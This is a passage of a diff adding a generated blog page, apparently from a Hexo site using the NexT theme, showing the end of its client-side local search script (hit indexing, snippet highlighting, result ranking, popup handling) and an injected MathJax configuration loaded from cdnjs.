+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
